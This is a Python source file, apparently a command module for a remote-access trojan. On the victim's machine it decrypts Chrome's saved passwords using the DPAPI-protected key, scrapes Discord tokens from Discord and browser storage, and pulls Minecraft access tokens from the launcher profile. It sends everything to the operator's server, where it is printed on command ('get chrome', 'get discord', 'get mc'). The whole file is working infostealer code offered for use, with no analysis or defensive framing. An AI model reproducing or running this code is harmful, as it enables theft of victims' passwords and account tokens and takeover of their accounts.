if isclient == True:
    def main():
        import os
        import json
        import base64
        import sqlite3
        import win32crypt
        from Crypto.Cipher import AES
        import shutil
        from datetime import timezone, datetime, timedelta
        def get_chrome_datetime(chromedate):
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

        def get_encryption_key():
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            # decode the encryption key from Base64
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # remove DPAPI str
            key = key[5:]
            # return decrypted key that was originally encrypted
            # using a session key derived from current user's logon credentials
            # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        def decrypt_password(password, key):
            try:
                # get the initialization vector
                iv = password[3:15]
                password = password[15:]
                # generate cipher
                cipher = AES.new(key, AES.MODE_GCM, iv)
                # decrypt password
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    # not supported
                    return ""
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        send_data = ''
        for row in cursor.fetchall():
            part_data = ''
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                part_data += f"Origin URL: {origin_url}\n"
                part_data += f"Action URL: {action_url}\n"
                part_data += f"Username: {username}\n"
                part_data += f"Password: {password}\n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                part_data += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
            if date_last_used != 86400000000 and date_last_used:
                part_data += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
            part_data += "="*50 + '\n'
            send_data += str(part_data)
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
        send(server, str(send_data).encode('utf-8'))

    def get_discord_token():
        PING_ME = False
        import os
        import re
        import json
        from urllib.request import Request, urlopen

        def find_tokens(path):
            path += '\\Local Storage\\leveldb'
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)
            return tokens
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }
        message = '@everyone' if PING_ME else ''
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            message += f'\n- {platform} -\n\n'
            tokens = find_tokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'
            message += ''
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }
        payload = json.dumps({'content': message})
        try:
            send(server, str(message).encode('utf-8'))
        except:
            send(server, b'failed to get discord tokens.')
    
    def get_mctoken():
        import json
        import os
        from urllib.request import Request, urlopen
        PING_ME = False
        def uuid_dashed(uuid):
            return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
        auth_db = json.loads(open(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]
        embeds = []
        for x in auth_db:
            try:
                email = auth_db[x].get("username")
                uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
                embed = {
                    "fields": [
                        {"name": "Email", "value": email if email and "@" in email else "N/A", "inline": False},
                        {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_"), "inline": True},
                        {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
                        {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
                    ]
                }
                embeds.append(embed)
            except:
                pass
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        payload = json.dumps({"embeds": embeds, "content": "@everyone" if PING_ME else ""})
        try:
            token = str(embeds)
            token1 = token.replace('[','').replace(']','').replace('{','').replace('}','').split(':')
            token2 = token.replace('[','').replace(']','').replace('{','').replace('}','').split(':')[len(token1) - 2][2:]
            token = token.replace('[','').replace(']','').replace('{','').replace('}','').split(':')[len(token1) - 2][2:][:len(token2) - 11]
            send(server, str(token).encode('utf-8'))
        except:
            pass

    try:
        if cmd.split()[1].lower() == 'chrome':
            main()
        elif cmd.split()[1].lower() == 'discord':
            get_discord_token()
        elif cmd.split()[1].lower() == 'minecraft' or cmd.split()[1].lower() == 'mc':
            get_mctoken()
        else:
            pass
    except:
        send(server, b'failed to get data.')

else:
    if len(cmd.split()) >= 2 and cmd.split()[1].lower() == 'chrome':
        data = receive(client)
        print(data.decode('utf-8'))
    elif len(cmd.split()) >= 2 and cmd.split()[1].lower() == 'discord':
        data = receive(client)
        print(data.decode('utf-8'))
    elif len(cmd.split()) >= 2 and cmd.split()[1].lower() == 'minecraft' or len(cmd.split()) >= 2 and cmd.split()[1].lower() == 'mc':
        data = receive(client)
        print(data.decode('utf-8'))
    else:
        if len(cmd.split()) == 1:
            data = receive(client)
        else:
            pass
        print(Fore.LIGHTRED_EX + 'usage: get <token / data> example: get chrome' + Fore.RESET)